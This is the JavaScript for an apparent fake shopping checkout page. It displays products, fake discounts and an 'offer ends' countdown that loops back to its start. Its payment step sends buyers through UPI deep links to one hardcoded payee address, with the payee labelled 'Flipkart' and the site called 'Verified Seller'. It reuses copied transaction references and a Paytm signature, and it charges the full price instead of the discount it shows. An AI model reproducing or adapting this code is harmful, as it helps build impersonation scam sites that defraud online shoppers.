var itemData;
$(document).ready(function () {
    startTimer(500 - 120, $('#offerend-time'));
    $(".form-check").on('click', function () {
        $(".form-check").removeClass('active');
        $(this).addClass('active');
    });
    $("#back_btn").on("click", function () {
        history.back();
    });

    var selected_verient = localStorage.getItem("selected_verient");
    itemData = JSON.parse(selected_verient);
    $("#item_image").prop('src', itemData.img1);
    var name = itemData.name + " " + ((itemData.color) ? ' (' + itemData.color + ')' : '') + ((itemData.size) ? ' (' + itemData.size + ')' : '') + ((itemData.storage) ? ' (' + itemData.storage + ')' : '');
    $("#product-title").html(name);
    $(".selling_price, .payable").html("&#8377;" + itemData.selling_price);
    $(".mrp").html("&#8377;" + itemData.mrp);
});

function startTimer(duration, display) {
    var timer = duration, minutes, seconds;
    setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.text(minutes + "min " + seconds + "sec");

        if (--timer < 0) {
            timer = duration;
        }
    }, 1000);
}

  var selected_verient = localStorage.getItem("selected_verient");
    itemData = JSON.parse(selected_verient);


let sellingPrice_phonepe = itemData.selling_price;
let fiftyPercent = sellingPrice_phonepe * 0.15;
    let phonepe_price = Math.round(sellingPrice_phonepe - fiftyPercent);
    console.log(phonepe_price)
    
    document.getElementById('discount_phonepe').innerHTML = `₹${Math.round(phonepe_price)}`;

let sellingPrice_paytm = itemData.selling_price;
let tenPercent = sellingPrice_paytm * 0.15;
    let paytm_price = Math.round(sellingPrice_paytm - tenPercent);
    console.log(paytm_price)
    
    document.getElementById('discount_paytm').innerHTML = `₹${Math.round(paytm_price)}`;
    
    
    
    let sellingPrice_total = itemData.selling_price;
let totalPercent = sellingPrice_total * 0.40;
    let totals_price = Math.round(sellingPrice_total - totalPercent);
    console.log(totals_price)
    
    document.getElementById('total_pricess').innerHTML = `₹${Math.round(totals_price)}`
     document.getElementById('total_pricessss').innerHTML = `₹${Math.round(totals_price)}`

    
    
    
function payNow() {
    var orderNumber = Math.floor(Math.random() * 10000000000);
    var payType = $(".form-check.active").attr('pay-type');
    var redirect_url = "";
    var site_name = "Verified Seller";
    var upi_address = "netc.34161FA820328AA2D1C6CEE0@mairtel";
    var amt = parseFloat(itemData.selling_price).toFixed(2);

    switch (payType) {
      case 'gpay':
         redirect_url = "tez://upi/pay?pa=" + upi_address + "&pn=Flipkart&tn=Order_Id_" + orderNumber + "&am="+ amt + "&tr=RZPQnsYrENZHXomLgqrv2&cu=INR&mc=5621&qrMedium=04&tn="+ site_name;
        break;
        case 'phonepe':
        redirect_url = "phonepe://pay?ver=01&mode=19&pa=" + upi_address + "&pn=" + site_name + "&tr=RZPQnsYrENZHXomLgqrv2&cu=INR&mc=5621&qrMedium=04&tn=TN_" + orderNumber + "&am="+amt + "";
            break;
        case 'paytm':
        redirect_url = "paytmmp://cash_wallet?pa=" + upi_address + "&pn=Online%Shopping" + "&am=" + amt + "&tr=RZPPYDwIIDfuh4iCnqrv2&mc=5732&cu=INR&tn=Online_Shoping&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr&featuretype=money_transfer";
        break;
      case 'bhim_upi':
        redirect_url = "upi://pay?pa=" + upi_address + "&pn=Online Store&tn=OrderId" + orderNumber + "&am="+ amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn="+ site_name;
        break;
      case 'whatsapp':
        redirect_url = "whatsapp://pay?pa=" + upi_address + "&pn=Online Store&tn=Order_Id_" + orderNumber + "&am="+ amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn="+ site_name;
        break;
      default:
            break;
    }
    window.location.href = redirect_url;

}










